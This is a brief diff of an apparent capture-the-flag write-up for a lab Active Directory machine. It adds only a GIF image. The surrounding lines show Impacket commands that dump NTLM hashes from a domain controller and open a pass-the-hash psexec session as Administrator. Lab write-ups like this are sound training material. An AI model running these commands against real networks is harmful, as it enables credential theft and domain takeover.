@@ -259,3 +259,5 @@ secretsdump.py -no-pass -k dc01.rebound.htb -just-dc-ntlm
 ```sh
 psexec.py 'rebound/Administrator'@dc01.rebound.htb -hashes '176be138594933bb67db3b2572fc91b8:176be138594933bb67db3b2572fc91b8'
 ```
+
+<img src="https://giffiles.alphacoders.com/206/206739.gif">
